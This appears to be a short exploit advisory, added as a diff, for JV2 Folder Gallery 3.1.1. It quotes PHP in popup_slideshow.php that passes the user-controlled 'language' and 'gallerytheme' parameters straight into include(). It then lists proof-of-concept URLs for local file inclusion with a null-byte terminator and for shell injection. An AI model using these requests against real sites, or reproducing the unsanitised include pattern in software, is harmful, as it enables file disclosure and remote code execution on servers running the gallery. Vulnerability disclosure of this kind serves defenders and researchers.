@@ -1,0 +1,32 @@
+-----------------------------------------------------------------------------------
+JV2 Folder Gallery 3.1.1 (popup_slideshow.php) Multiple Vulnerability
+-----------------------------------------------------------------------------------
+Vendor:		www.foldergallery.jv2.net
+download:	http://foldergallery.jv2.net/Download/
+Author:		eidelweiss
+Thank`s:		All Friends & All Hacker`s
+
+-----------------------------------------------------------------------------------
+
+	-=[ Vuln Code ]=-
+
+[-] /path/gallery/gallery/popup_slideshow.php
+
+<?php 
+include ("config/gallerysetup.php");
+include ("config/galleryconfig.php");
+include ("config/file_handling.php");
+include ("config/lang/".$language.".php");	// <= 1
+include ("theme/".$gallerytheme."/config.php");	// <= 2
+
+-----------------------------------------------------------------------------------
+
+	-=[ P0C ]=-
+
+	http://127.0.0.1/path/gallery/popup_slideshow.php?language= [LFI]%00
+
+	http://127.0.0.1/path/gallery/popup_slideshow.php?gallerytheme= [LFI]%00
+
+	http://127.0.0.1/path/gallery/popup_slideshow.php?gallerytheme= [inj3ct0r shell]
+
+=========================| -=[ E0F ]=- |=========================
